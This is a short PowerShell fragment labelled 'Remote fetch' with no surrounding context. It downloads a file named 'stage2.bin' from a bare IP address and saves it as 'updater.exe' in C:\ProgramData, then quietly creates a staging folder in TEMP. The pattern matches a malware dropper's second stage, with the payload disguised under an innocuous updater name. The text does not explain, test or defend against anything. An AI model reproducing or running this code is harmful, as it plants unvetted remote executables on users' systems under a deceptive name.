
<# Remote fetch #> try { $RemoteUrl = 'http://198.51.100.135/stage2.bin'; $DropPath = "C:\ProgramData\updater.exe"; Invoke-WebRequest -Uri $RemoteUrl -OutFile $DropPath -UseBasicParsing; $ProgressPreference = "SilentlyContinue"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Remote fetch failed" }
